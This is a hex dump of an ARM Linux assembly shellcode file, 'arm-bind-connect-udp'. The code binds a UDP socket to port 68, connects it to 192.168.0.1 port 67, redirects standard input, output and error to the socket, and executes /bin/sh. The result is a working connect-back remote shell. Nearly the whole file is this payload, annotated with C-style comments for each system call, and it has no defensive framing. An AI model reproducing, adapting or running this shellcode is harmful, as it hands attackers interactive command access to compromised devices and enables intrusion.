00000000  2f 2a 0d 0a 20 2a 20 54  69 74 6c 65 3a 20 61 72  |/*.. * Title: ar|
00000010  6d 2d 62 69 6e 64 2d 63  6f 6e 6e 65 63 74 2d 75  |m-bind-connect-u|
00000020  64 70 0d 0a 20 2a 20 42  72 69 65 66 3a 20 42 69  |dp.. * Brief: Bi|
00000030  6e 64 20 74 6f 20 70 6f  72 74 20 36 38 20 6f 6e  |nd to port 68 on|
00000040  20 61 6e 79 20 6c 6f 63  61 6c 20 61 64 64 72 65  | any local addre|
00000050  73 73 20 61 6e 64 20 70  6c 75 67 20 61 20 75 64  |ss and plug a ud|
00000060  70 20 73 68 65 6c 6c 0d  0a 20 2a 20 20 20 20 20  |p shell.. *     |
00000070  20 20 20 6f 6e 74 6f 20  74 6f 20 70 6f 72 74 20  |   onto to port |
00000080  36 37 20 6f 6e 20 31 39  32 2e 31 36 38 2e 30 2e  |67 on 192.168.0.|
00000090  31 0d 0a 20 2a 20 41 75  74 68 6f 72 3a 20 44 61  |1.. * Author: Da|
000000a0  6e 69 65 6c 20 47 6f 64  61 73 2d 4c 6f 70 65 7a  |niel Godas-Lopez|
000000b0  20 3c 67 6d 61 69 6c 20  61 63 63 6f 75 6e 74 20  | <gmail account |
000000c0  64 67 6f 64 61 73 3e 0d  0a 20 2a 2f 0d 0a 20 0d  |dgodas>.. */.. .|
000000d0  0a 2e 69 66 20 31 0d 0a  20 20 20 20 2f 2a 0d 0a  |..if 1..    /*..|
000000e0  20 20 20 20 20 20 63 6c  6f 73 65 28 33 29 2c 20  |      close(3), |
000000f0  63 6c 6f 73 65 28 34 29  2c 20 2e 2e 2e 2c 20 63  |close(4), ..., c|
00000100  6c 6f 73 65 28 31 30 32  34 29 0d 0a 20 20 20 20  |lose(1024)..    |
00000110  20 2a 2f 0d 0a 20 0d 0a  20 20 20 20 6d 6f 76 20  | */.. ..    mov |
00000120  25 72 31 2c 20 24 31 30  32 34 0d 0a 31 3a 20 20  |%r1, $1024..1:  |
00000130  6d 6f 76 20 25 72 30 2c  20 25 72 31 0d 0a 20 20  |mov %r0, %r1..  |
00000140  20 20 73 76 63 20 30 78  30 30 39 30 30 30 30 36  |  svc 0x00900006|
00000150  0d 0a 20 20 20 20 73 75  62 73 20 25 72 31 2c 20  |..    subs %r1, |
00000160  25 72 31 2c 20 24 31 0d  0a 20 20 20 20 73 75 62  |%r1, $1..    sub|
00000170  73 20 25 72 32 2c 20 25  72 31 2c 20 24 33 0d 0a  |s %r2, %r1, $3..|
00000180  20 20 20 20 62 70 6c 20  31 62 0d 0a 2e 65 6e 64  |    bpl 1b...end|
00000190  69 66 0d 0a 20 0d 0a 20  20 20 20 2f 2a 0d 0a 20  |if.. ..    /*.. |
000001a0  20 20 20 20 20 73 6f 63  5f 64 65 73 20 3d 20 73  |     soc_des = s|
000001b0  6f 63 6b 65 74 28 41 46  5f 49 4e 45 54 2c 20 53  |ocket(AF_INET, S|
000001c0  4f 43 4b 5f 44 47 52 41  4d 2c 20 49 50 50 52 4f  |OCK_DGRAM, IPPRO|
000001d0  54 4f 5f 55 44 50 29 3b  0d 0a 20 20 20 20 20 2a  |TO_UDP);..     *|
000001e0  2f 0d 0a 20 0d 0a 20 20  20 20 6d 6f 76 20 25 72  |/.. ..    mov %r|
000001f0  30 2c 20 24 32 20 20 20  20 20 2f 2a 20 41 46 5f  |0, $2     /* AF_|
00000200  49 4e 45 54 20 2a 2f 0d  0a 20 20 20 20 6d 6f 76  |INET */..    mov|
00000210  20 25 72 31 2c 20 24 32  20 20 20 20 20 2f 2a 20  | %r1, $2     /* |
00000220  53 4f 43 4b 5f 44 47 52  41 4d 20 2a 2f 0d 0a 20  |SOCK_DGRAM */.. |
00000230  20 20 20 6d 6f 76 20 25  72 32 2c 20 24 31 37 20  |   mov %r2, $17 |
00000240  20 20 20 20 20 20 20 2f  2a 20 49 50 50 52 54 4f  |       /* IPPRTO|
00000250  54 4f 5f 55 44 50 20 2a  2f 0d 0a 20 20 20 20 70  |TO_UDP */..    p|
00000260  75 73 68 20 7b 25 72 30  2c 20 25 72 31 2c 20 25  |ush {%r0, %r1, %|
00000270  72 32 7d 0d 0a 20 20 20  20 6d 6f 76 20 25 72 30  |r2}..    mov %r0|
00000280  2c 20 24 31 20 20 20 20  20 2f 2a 20 73 6f 63 6b  |, $1     /* sock|
00000290  65 74 20 2a 2f 0d 0a 20  20 20 20 6d 6f 76 20 25  |et */..    mov %|
000002a0  72 31 2c 20 25 73 70 0d  0a 20 20 20 20 73 76 63  |r1, %sp..    svc|
000002b0  20 30 78 30 30 39 30 30  30 36 36 0d 0a 20 20 20  | 0x00900066..   |
000002c0  20 61 64 64 20 25 73 70  2c 20 25 73 70 2c 20 24  | add %sp, %sp, $|
000002d0  31 32 0d 0a 20 0d 0a 20  20 20 20 6d 6f 76 20 25  |12.. ..    mov %|
000002e0  72 36 2c 20 25 72 30 20  20 20 20 20 20 20 20 2f  |r6, %r0        /|
000002f0  2a 20 72 36 20 3d 20 73  6f 63 5f 64 65 73 20 2a  |* r6 = soc_des *|
00000300  2f 0d 0a 20 0d 0a 20 20  20 20 2f 2a 0d 0a 20 20  |/.. ..    /*..  |
00000310  20 20 20 20 62 69 6e 64  28 73 6f 63 5f 64 65 73  |    bind(soc_des|
00000320  2c 20 28 73 74 72 75 63  74 20 73 6f 63 6b 61 64  |, (struct sockad|
00000330  64 72 2a 29 20 26 73 65  72 76 5f 61 64 64 72 2c  |dr*) &serv_addr,|
00000340  20 73 69 7a 65 6f 66 28  73 65 72 76 5f 61 64 64  | sizeof(serv_add|
00000350  72 29 29 3b 0d 0a 20 20  20 20 20 2a 2f 0d 0a 20  |r));..     */.. |
00000360  0d 0a 2e 69 66 20 30 20  2f 2a 20 72 30 20 3d 3d  |...if 0 /* r0 ==|
00000370  20 72 36 20 61 6c 72 65  61 64 79 20 2a 2f 0d 0a  | r6 already */..|
00000380  20 20 20 20 6d 6f 76 20  25 72 30 2c 20 25 72 36  |    mov %r0, %r6|
00000390  20 20 20 20 20 20 20 20  2f 2a 20 73 6f 63 5f 64  |        /* soc_d|
000003a0  65 73 20 2a 2f 0d 0a 2e  65 6e 64 69 66 0d 0a 20  |es */...endif.. |
000003b0  0d 0a 20 20 20 20 6d 6f  76 20 25 72 31 2c 20 24  |..    mov %r1, $|
000003c0  30 78 34 34 30 30 30 30  30 30 0d 0a 20 20 20 20  |0x44000000..    |
000003d0  61 64 64 20 25 72 31 2c  20 24 32 20 20 20 20 20  |add %r1, $2     |
000003e0  2f 2a 20 70 6f 72 74 20  3d 20 36 38 2c 20 66 61  |/* port = 68, fa|
000003f0  6d 69 6c 79 20 3d 20 32  20 28 41 46 5f 49 4e 45  |mily = 2 (AF_INE|
00000400  54 29 20 2a 2f 0d 0a 20  20 20 20 73 75 62 20 25  |T) */..    sub %|
00000410  72 32 2c 20 25 72 32 2c  20 25 72 32 20 20 20 2f  |r2, %r2, %r2   /|
00000420  2a 20 61 64 64 72 20 3d  20 30 2e 30 2e 30 2e 30  |* addr = 0.0.0.0|
00000430  20 2a 2f 0d 0a 20 20 20  20 70 75 73 68 20 7b 25  | */..    push {%|
00000440  72 31 2c 20 25 72 32 7d  0d 0a 20 20 20 20 6d 6f  |r1, %r2}..    mo|
00000450  76 20 25 72 31 2c 20 25  73 70 20 20 20 20 20 20  |v %r1, %sp      |
00000460  20 20 2f 2a 20 70 6f 69  6e 74 65 72 20 74 6f 20  |  /* pointer to |
00000470  73 6f 63 6b 61 64 64 72  5f 69 6e 20 2a 2f 0d 0a  |sockaddr_in */..|
00000480  20 20 20 20 6d 6f 76 20  25 72 32 2c 20 24 31 36  |    mov %r2, $16|
00000490  20 20 20 20 20 20 20 20  2f 2a 20 73 69 7a 65 6f  |        /* sizeo|
000004a0  66 28 73 74 72 75 63 74  20 73 6f 63 6b 61 64 64  |f(struct sockadd|
000004b0  72 5f 69 6e 29 20 2a 2f  0d 0a 20 20 20 20 20 0d  |r_in) */..     .|
000004c0  0a 20 20 20 20 70 75 73  68 20 7b 25 72 30 2c 20  |.    push {%r0, |
000004d0  25 72 31 2c 20 25 72 32  7d 0d 0a 20 20 20 20 6d  |%r1, %r2}..    m|
000004e0  6f 76 20 25 72 30 2c 20  24 32 20 20 20 20 20 2f  |ov %r0, $2     /|
000004f0  2a 20 62 69 6e 64 20 2a  2f 0d 0a 20 20 20 20 6d  |* bind */..    m|
00000500  6f 76 20 25 72 31 2c 20  25 73 70 0d 0a 20 20 20  |ov %r1, %sp..   |
00000510  20 73 76 63 20 30 78 30  30 39 30 30 30 36 36 0d  | svc 0x00900066.|
00000520  0a 20 20 20 20 61 64 64  20 25 73 70 2c 20 25 73  |.    add %sp, %s|
00000530  70 2c 20 24 32 30 0d 0a  20 0d 0a 20 20 20 20 2f  |p, $20.. ..    /|
00000540  2a 0d 0a 20 20 20 20 20  20 63 6f 6e 6e 65 63 74  |*..      connect|
00000550  28 73 6f 63 5f 64 65 73  2c 20 28 73 74 72 75 63  |(soc_des, (struc|
00000560  74 20 73 6f 63 6b 61 64  64 72 2a 29 20 26 63 6c  |t sockaddr*) &cl|
00000570  69 5f 61 64 64 72 2c 20  73 69 7a 65 6f 66 28 63  |i_addr, sizeof(c|
00000580  6c 69 5f 61 64 64 72 29  29 3b 0d 0a 20 20 20 20  |li_addr));..    |
00000590  20 2a 2f 0d 0a 20 0d 0a  20 20 20 20 6d 6f 76 20  | */.. ..    mov |
000005a0  25 72 30 2c 20 25 72 36  20 20 20 20 20 20 20 20  |%r0, %r6        |
000005b0  2f 2a 20 73 6f 63 5f 64  65 73 20 2a 2f 0d 0a 20  |/* soc_des */.. |
000005c0  0d 0a 20 20 20 20 6d 6f  76 20 25 72 31 2c 20 24  |..    mov %r1, $|
000005d0  30 78 34 33 30 30 30 30  30 30 0d 0a 20 20 20 20  |0x43000000..    |
000005e0  61 64 64 20 25 72 31 2c  20 24 32 20 20 20 20 20  |add %r1, $2     |
000005f0  2f 2a 20 70 6f 72 74 20  3d 20 36 37 2c 20 66 61  |/* port = 67, fa|
00000600  6d 69 6c 79 20 3d 20 32  20 28 41 46 5f 49 4e 45  |mily = 2 (AF_INE|
00000610  54 29 20 2a 2f 0d 0a 20  20 20 20 6d 6f 76 20 25  |T) */..    mov %|
00000620  72 32 2c 20 24 30 78 31  30 30 30 30 30 30 0d 0a  |r2, $0x1000000..|
00000630  20 20 20 20 61 64 64 20  25 72 32 2c 20 25 72 32  |    add %r2, %r2|
00000640  2c 20 24 30 78 61 38 30  30 0d 0a 20 20 20 20 61  |, $0xa800..    a|
00000650  64 64 20 25 72 32 2c 20  24 30 78 63 30 20 20 20  |dd %r2, $0xc0   |
00000660  20 20 20 2f 2a 20 61 64  64 72 20 3d 20 31 39 32  |   /* addr = 192|
00000670  2e 31 36 38 2e 30 2e 31  20 2a 2f 0d 0a 20 20 20  |.168.0.1 */..   |
00000680  20 70 75 73 68 20 7b 25  72 31 2c 20 25 72 32 7d  | push {%r1, %r2}|
00000690  0d 0a 20 20 20 20 6d 6f  76 20 25 72 31 2c 20 25  |..    mov %r1, %|
000006a0  73 70 20 20 20 20 20 20  20 20 2f 2a 20 70 6f 69  |sp        /* poi|
000006b0  6e 74 65 72 20 74 6f 20  73 6f 63 6b 61 64 64 72  |nter to sockaddr|
000006c0  5f 69 6e 20 2a 2f 0d 0a  20 20 20 20 6d 6f 76 20  |_in */..    mov |
000006d0  25 72 32 2c 20 24 31 36  20 20 20 20 20 20 20 20  |%r2, $16        |
000006e0  2f 2a 20 73 69 7a 65 6f  66 28 73 74 72 75 63 74  |/* sizeof(struct|
000006f0  20 73 6f 63 6b 61 64 64  72 5f 69 6e 29 20 2a 2f  | sockaddr_in) */|
00000700  0d 0a 20 0d 0a 20 20 20  20 70 75 73 68 20 7b 25  |.. ..    push {%|
00000710  72 30 2c 20 25 72 31 2c  20 25 72 32 7d 0d 0a 20  |r0, %r1, %r2}.. |
00000720  20 20 20 6d 6f 76 20 25  72 30 2c 20 24 33 20 20  |   mov %r0, $3  |
00000730  20 20 20 2f 2a 20 63 6f  6e 6e 65 63 74 20 2a 2f  |   /* connect */|
00000740  0d 0a 20 20 20 20 6d 6f  76 20 25 72 31 2c 20 25  |..    mov %r1, %|
00000750  73 70 0d 0a 20 20 20 20  73 76 63 20 30 78 30 30  |sp..    svc 0x00|
00000760  39 30 30 30 36 36 0d 0a  20 20 20 20 61 64 64 20  |900066..    add |
00000770  25 73 70 2c 20 25 73 70  2c 20 24 32 30 0d 0a 20  |%sp, %sp, $20.. |
00000780  0d 0a 20 20 20 20 2f 2a  0d 0a 20 20 20 20 20 20  |..    /*..      |
00000790  64 75 70 32 28 73 6f 63  5f 63 6c 69 2c 30 29 3b  |dup2(soc_cli,0);|
000007a0  0d 0a 20 20 20 20 20 20  64 75 70 32 28 73 6f 63  |..      dup2(soc|
000007b0  5f 63 6c 69 2c 31 29 3b  0d 0a 20 20 20 20 20 20  |_cli,1);..      |
000007c0  64 75 70 32 28 73 6f 63  5f 63 6c 69 2c 32 29 3b  |dup2(soc_cli,2);|
000007d0  0d 0a 20 20 20 20 20 2a  2f 0d 0a 20 0d 0a 20 20  |..     */.. ..  |
000007e0  20 20 6d 6f 76 20 25 72  31 2c 20 24 32 0d 0a 31  |  mov %r1, $2..1|
000007f0  3a 20 20 6d 6f 76 20 25  72 30 2c 20 25 72 36 0d  |:  mov %r0, %r6.|
00000800  0a 20 20 20 20 73 76 63  20 30 78 30 30 39 30 30  |.    svc 0x00900|
00000810  30 33 66 0d 0a 20 20 20  20 73 75 62 73 20 25 72  |03f..    subs %r|
00000820  31 2c 20 25 72 31 2c 20  24 31 0d 0a 20 20 20 20  |1, %r1, $1..    |
00000830  62 70 6c 20 31 62 0d 0a  20 0d 0a 20 20 20 20 2f  |bpl 1b.. ..    /|
00000840  2a 0d 0a 20 20 20 20 20  20 65 78 65 63 76 65 28  |*..      execve(|
00000850  22 2f 62 69 6e 2f 73 68  22 2c 20 70 61 72 6d 73  |"/bin/sh", parms|
00000860  2c 20 65 6e 76 29 3b 0d  0a 20 20 20 20 20 2a 2f  |, env);..     */|
00000870  0d 0a 20 0d 0a 20 20 20  20 73 75 62 20 25 72 31  |.. ..    sub %r1|
00000880  2c 20 25 73 70 2c 20 24  34 20 20 20 20 2f 2a 20  |, %sp, $4    /* |
00000890  61 72 67 76 5b 30 5d 20  3d 20 22 73 68 22 20 2a  |argv[0] = "sh" *|
000008a0  2f 0d 0a 20 20 20 20 73  75 62 20 25 72 32 2c 20  |/..    sub %r2, |
000008b0  25 72 32 2c 20 25 72 32  20 20 20 2f 2a 20 61 72  |%r2, %r2   /* ar|
000008c0  67 76 5b 31 5d 20 3d 20  30 78 30 30 30 30 30 30  |gv[1] = 0x000000|
000008d0  30 30 20 2a 2f 0d 0a 20  20 20 20 6d 6f 76 20 25  |00 */..    mov %|
000008e0  72 33 2c 20 24 30 78 32  66 0d 0a 20 20 20 20 6d  |r3, $0x2f..    m|
000008f0  6f 76 20 25 72 37 2c 20  24 30 78 36 32 0d 0a 20  |ov %r7, $0x62.. |
00000900  20 20 20 61 64 64 20 25  72 33 2c 20 25 72 37 2c  |   add %r3, %r7,|
00000910  20 6c 73 6c 20 24 38 0d  0a 20 20 20 20 6d 6f 76  | lsl $8..    mov|
00000920  20 25 72 37 2c 20 24 30  78 36 39 0d 0a 20 20 20  | %r7, $0x69..   |
00000930  20 61 64 64 20 25 72 33  2c 20 25 72 37 2c 20 6c  | add %r3, %r7, l|
00000940  73 6c 20 24 31 36 0d 0a  20 20 20 20 6d 6f 76 20  |sl $16..    mov |
00000950  25 72 37 2c 20 24 30 78  36 65 0d 0a 20 20 20 20  |%r7, $0x6e..    |
00000960  61 64 64 20 25 72 33 2c  20 25 72 37 2c 20 6c 73  |add %r3, %r7, ls|
00000970  6c 20 24 32 34 20 20 20  2f 2a 20 27 2f 27 20 20  |l $24   /* '/'  |
00000980  27 62 27 20 20 27 69 27  20 20 27 6e 27 20 20 2a  |'b'  'i'  'n'  *|
00000990  2f 0d 0a 20 20 20 20 6d  6f 76 20 25 72 34 2c 20  |/..    mov %r4, |
000009a0  24 27 2f 27 0d 0a 20 20  20 20 6d 6f 76 20 25 72  |$'/'..    mov %r|
000009b0  37 2c 20 24 27 73 27 0d  0a 20 20 20 20 61 64 64  |7, $'s'..    add|
000009c0  20 25 72 34 2c 20 25 72  37 2c 20 6c 73 6c 20 24  | %r4, %r7, lsl $|
000009d0  38 0d 0a 20 20 20 20 6d  6f 76 20 25 72 37 2c 20  |8..    mov %r7, |
000009e0  24 27 68 27 0d 0a 20 20  20 20 61 64 64 20 25 72  |$'h'..    add %r|
000009f0  34 2c 20 25 72 37 2c 20  6c 73 6c 20 24 31 36 20  |4, %r7, lsl $16 |
00000a00  20 20 2f 2a 20 27 2f 27  20 20 27 73 27 20 20 27  |  /* '/'  's'  '|
00000a10  68 27 20 20 30 78 30 30  20 2a 2f 0d 0a 20 20 20  |h'  0x00 */..   |
00000a20  20 6d 6f 76 20 25 72 35  2c 20 24 27 73 27 0d 0a  | mov %r5, $'s'..|
00000a30  20 20 20 20 6d 6f 76 20  25 72 37 2c 20 24 27 68  |    mov %r7, $'h|
00000a40  27 0d 0a 20 20 20 20 61  64 64 20 25 72 35 2c 20  |'..    add %r5, |
00000a50  25 72 37 2c 20 6c 73 6c  20 24 38 20 20 20 20 2f  |%r7, lsl $8    /|
00000a60  2a 20 27 73 27 20 20 27  68 27 20 20 30 78 30 30  |* 's'  'h'  0x00|
00000a70  20 30 78 30 30 20 2a 2f  0d 0a 20 0d 0a 20 20 20  | 0x00 */.. ..   |
00000a80  20 70 75 73 68 20 7b 25  72 31 2c 20 25 72 32 2c  | push {%r1, %r2,|
00000a90  20 25 72 33 2c 20 25 72  34 2c 20 25 72 35 7d 0d  | %r3, %r4, %r5}.|
00000aa0  0a 20 0d 0a 20 20 20 20  61 64 64 20 25 72 30 2c  |. ..    add %r0,|
00000ab0  20 25 73 70 2c 20 24 38  20 20 20 20 2f 2a 20 66  | %sp, $8    /* f|
00000ac0  69 6c 65 6e 61 6d 65 20  70 74 72 20 2a 2f 0d 0a  |ilename ptr */..|
00000ad0  20 20 20 20 61 64 64 20  25 72 31 2c 20 25 73 70  |    add %r1, %sp|
00000ae0  2c 20 24 30 20 20 20 20  2f 2a 20 61 72 67 76 20  |, $0    /* argv |
00000af0  70 74 72 20 2a 2f 0d 0a  20 20 20 20 61 64 64 20  |ptr */..    add |
00000b00  25 72 32 2c 20 25 73 70  2c 20 24 34 20 20 20 20  |%r2, %sp, $4    |
00000b10  2f 2a 20 65 6e 76 20 70  74 72 20 2a 2f 0d 0a 20  |/* env ptr */.. |
00000b20  0d 0a 20 20 20 20 73 76  63 20 30 78 30 30 39 30  |..    svc 0x0090|
00000b30  30 30 30 62                                       |000b|
00000b34
